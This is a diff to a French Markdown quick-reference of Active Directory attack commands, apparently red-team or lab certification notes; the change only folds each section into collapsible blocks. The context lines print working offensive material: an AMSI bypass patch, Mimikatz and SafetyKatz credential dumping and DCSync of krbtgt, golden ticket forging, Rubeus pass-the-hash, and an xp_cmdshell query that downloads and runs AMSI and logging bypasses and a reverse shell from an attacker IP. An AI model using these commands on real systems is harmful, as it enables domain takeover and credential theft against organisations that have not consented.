@@ -11,6 +11,8 @@ Référence rapide des commandes. Chaque bloc est accompagné d'une explication 
 
 Repères sur les mécanismes de contrôle et de journalisation de PowerShell.
 
+::: details Afficher les commandes
+
 ### AMSI Bypass
 
 Le script agit sur les mécanismes internes d'AMSI dans la session PowerShell.
@@ -64,9 +66,13 @@ $KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
 [System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
 ```
 
+:::
+
 ## Enumeration
 
 Commandes d'énumération Active Directory avec le module AD et PowerView.
+
+::: details Afficher les commandes
 
 ### AD Module - Import
 
@@ -126,9 +132,13 @@ Get-ForestDomain -Verbose | Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_S
 Get-ForestTrust -Forest <forest>
 ```
 
+:::
+
 ## Local Privesc
 
 Contrôles locaux sur les permissions Windows, les services et les groupes.
+
+::: details Afficher les commandes
 
 ### Local Privilege Escalation - PowerUp
 
@@ -192,9 +202,13 @@ Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'man
 Get-DomainObjectAcl -Identity machineadmins -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'managers'}
 ```
 
+:::
+
 ## LAPS
 
 Vérification des permissions et des attributs liés à Local Administrator Password Solution.
+
+::: details Afficher les commandes
 
 ### LAPS - Modules
 
@@ -237,9 +251,13 @@ $mailmgmt = New-PSSession -ComputerName <computer> -Credential $creds
 $mailmgmt
 ```
 
+:::
+
 ## Extract Credentials
 
 Exemples de sessions distantes, de transfert et d'examen du matériel d'authentification.
+
+::: details Afficher les commandes
 
 ### WinRS - File Transfer
 
@@ -299,9 +317,13 @@ Enter-PSSession $mailmgmt
 Invoke-Mimi -Command '"sekurlsa::keys"'
 ```
 
+:::
+
 ## gMSA
 
 Énumération des comptes Group Managed Service Account et de leurs autorisations.
+
+::: details Afficher les commandes
 
 ### gMSA - Enumeration
 
@@ -328,9 +350,13 @@ $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
 ConvertTo-NTHash –Password $decodedpwd.SecureCurrentPassword
 ```
 
+:::
+
 ## PTH
 
 Exemples de contextes d'authentification avec hashes et tickets Kerberos.
+
+::: details Afficher les commandes
 
 ### Pass-the-Hash - AES
 
@@ -358,9 +384,13 @@ Demande un TGT Kerberos en utilisant le matériel d'authentification fourni.
 C:\AD\Tools\Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<password> opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
+:::
+
 ## Application Whitelisting
 
 Vérification des contrôles Windows CLM, AppLocker et WDAC, ainsi que d'artefacts locaux.
+
+::: details Afficher les commandes
 
 ### Constrained Language Mode
 
@@ -444,9 +474,13 @@ Rapatrie le fichier PFX exporté depuis la machine distante.
 echo F | xcopy \\us-jump\C$\Users\Public\user.pfx C:\AD\Tools\user.pfx
 ```
 
+:::
+
 ## Unconstrained delegation
 
 Recherche des systèmes configurés avec Unconstrained Delegation et observation des tickets.
+
+::: details Afficher les commandes
 
 ### Unconstrained Delegation - Discovery
 
@@ -528,9 +562,13 @@ Présente un exemple de requête DCSync dans une autre forêt.
 C:\AD\Tools\SharpKatz.exe --Command dcsync --User usvendor\krbtgt --Domain usvendor.local --DomainController usvendor-dc.usvendor.local
 ```
 
+:::
+
 ## Constrained delegation
 
 Identification de Constrained Delegation et exemples de tickets de service.
+
+::: details Afficher les commandes
 
 ### Constrained Delegation - Enumeration
 
@@ -575,9 +613,13 @@ C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\krbtgt --Domain domain.
 C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\administrator --Domain domain.local --DomainController dc.domain.local
 ```
 
+:::
+
 ## ACLs Write Permissions
 
 Analyse des ACL, des Write Permissions et de Resource-Based Constrained Delegation.
+
+::: details Afficher les commandes
 
 ### Remote Tooling
 
@@ -642,9 +684,13 @@ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 conne
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
 ```
 
+:::
+
 ## Tickets
 
 Exemples de Golden Tickets, Silver Tickets et tickets associés à différents services.
+
+::: details Afficher les commandes
 
 ### Golden Ticket - SafetyKatz
 
@@ -708,9 +754,13 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<
 Get-WmiObject -Class win32_operatingsystem -ComputerName <computer name>
 ```
 
+:::
+
 ## DCSync
 
 Consultation des droits de réplication et des commandes associées à DCSync.
+
+::: details Afficher les commandes
 
 ### DCSync - Preparation
 
@@ -762,9 +812,13 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:domain\krbtgt" "exit"
 Invoke-Mimi -Command '"lsadump::dcsync /user:domain\krbtgt"'
 ```
 
+:::
+
 ## AD CS
 
 Énumération d'Active Directory Certificate Services et exemples d'authentification par certificat.
+
+::: details Afficher les commandes
 
 ### AD CS - Certificate Authorities
 
@@ -809,9 +863,13 @@ C:\AD\Tools\Rubeus.exe asktgt /user:domain.local\Administrator /dc:domain-dc.dom
 winrs -r:domain-dc whoami
 ```
 
+:::
+
 ## Azure AD Connect
 
 Repères sur les comptes MSOL utilisés avec Azure AD Connect.
+
+::: details Afficher les commandes
 
 ### Azure AD Connect - MSOL Accounts
 
@@ -856,9 +914,13 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Invoke-Mimi -Command '"lsadump::dcsync /user:domain\administrator /domain:domain.local"'
 ```
 
+:::
+
 ## Domain Privesc (TrustKey & KRBTGT)
 
 Exemples de tickets Kerberos et de relations de confiance entre domaines.
+
+::: details Afficher les commandes
 
 ### TrustKey - Initial Context
 
@@ -915,9 +977,13 @@ klist
 winrs -r:domain-dc cmd
 ```
 
+:::
+
 ## Abuse Trust Relationship (Forest)
 
 Énumération et illustration des mécanismes d'authentification inter-forêts.
+
+::: details Afficher les commandes
 
 ### Forest Trust - Kerberos Context
 
@@ -992,9 +1058,13 @@ winrs -r:domain-net.domain.local cmd
 whoami /groups
 ```
 
+:::
+
 ## MSSQL
 
 Requêtes d'énumération SQL Server, linked servers et paramètres d'exécution.
+
+::: details Afficher les commandes
 
 ### PowerUpSQL - Linked Servers
 
@@ -1045,9 +1115,13 @@ Présente une requête SQL qui déclenche une commande PowerShell à distance.
 Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.x/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.x/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv
 ```
 
+:::
+
 ## Foreign Security Principals (FSPs)
 
 Identification des Foreign Security Principals, groupes et ACL inter-domaines.
+
+::: details Afficher les commandes
 
 ### FSP - PowerView
 
@@ -1110,9 +1184,13 @@ $dbdc = New-PSSession -Computername db-dc.db.local -Credential $creds
 Invoke-Command -scriptblock{whoami;hostname} -Session $dbdc
 ```
 
+:::
+
 ## PAM Trust
 
 Analyse des PAM Trusts, Shadow Principals et connexions entre forêts.
+
+::: details Afficher les commandes
 
 ### PAM Trust - Foreign Principals
 
@@ -1205,9 +1283,13 @@ C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:administrator /domain:domain
 Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
 ```
 
+:::
+
 ## Mindmaps
 
 Schémas récapitulatifs pour Active Directory, les ACL et les outils associés.
+
+::: details Afficher les Mindmaps
 
 ### AD Mindmap
 
@@ -1228,4 +1310,6 @@ Schémas récapitulatifs pour Active Directory, les ACL et les outils associés.
 ### BloodHound Collector
 
 ![BloodHound Collector](./assets/10.png)
+
+:::
 
